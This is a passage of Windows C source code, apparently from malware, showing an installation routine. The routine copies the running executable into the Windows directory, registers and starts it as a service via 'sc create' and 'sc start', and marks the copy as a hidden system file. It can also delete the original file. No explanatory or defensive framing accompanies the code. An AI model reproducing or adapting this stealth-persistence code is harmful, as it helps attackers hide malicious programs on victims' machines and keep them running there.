    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable); 
    if ( !GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH) ) return ;
    
    if( !GetModuleFileName( NULL, (LPSTR)szPath, MAX_PATH ) ) return ;
    
    if(!GetCurrentDirectory(MAX_PATH,Direectory)) return ;

    if (strcmp(Direectory,target) != 0 ){

        strcat(target,"\\");
        
        strcat(target,RELEASE_NAME);

        if (!CopyF(szPath,target,3000)){
            CopyFile(szPath,target,TRUE);
        }

        sprintf(cmd,"sc create %s binPath= %s",SERVICEC_NAME,target);
        system(cmd);
        sprintf(cmd,"attrib +s +a +h +r %s",target);
        system(cmd);
        sprintf(cmd,"sc start %s",SERVICEC_NAME);
        system(cmd);
        if (auto_delete)DeleteSelf(szPath);
        
        exit(0);
        return ;
     }
}
/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////

 //               Kernel  Function  END                    //

/////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////

int _stdcall WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
    
    // ServiceInstall(true);
    
    Handle();
    return 0;
}
